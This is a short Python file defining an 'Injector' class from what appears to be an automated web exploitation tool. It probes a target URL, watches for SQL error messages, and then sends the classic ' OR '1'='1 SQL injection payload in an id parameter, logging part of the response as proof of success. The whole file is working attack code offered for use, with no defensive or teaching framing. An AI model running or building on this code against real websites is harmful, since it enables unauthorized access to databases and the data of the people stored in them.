import requests
from utils.http import HttpUtils

class Injector:
    def __init__(self, url, logger):
        self.url = url if url.startswith("http://") or url.startswith("https://") else "http://" + url
        self.logger = logger
        self.timeout = 10

    def set_timeout(self, timeout):
        self.timeout = timeout

    def inject(self):
        self.logger.log("Performing automatic exploitation...")
        self.logger.log(f"Sending request to {self.url} with timeout {self.timeout}")
        response = HttpUtils.send_request(self.url, self.timeout)
        results = []
        if response:
            self.logger.log(f"Received response: {response.status_code} {response.reason}")
            if "SQL syntax error" in response.text:
                self.logger.log("SQL Injection vulnerability detected, attempting to exploit...")
                results.extend(self.exploit_sql_injection())
            else:
                self.logger.log("No known vulnerability detected.")
                results.append("No known vulnerability detected")
        else:
            self.logger.log("Failed to get a response from the target.")
            results.append("Failed to get a response")
        return results

    def exploit_sql_injection(self):
        results = []
        payload = "' OR '1'='1"
        full_url = f"{self.url}?id={payload}"
        response = HttpUtils.send_request(full_url, self.timeout)
        if response:
            self.logger.log(f"SQL Injection successful, response: {response.text[:100]}...")
            results.append(f"SQL Injection successful, response: {response.text[:100]}")
        else:
            self.logger.log("SQL Injection failed, no response received.")
            results.append("SQL Injection failed, no response received.")
        return results
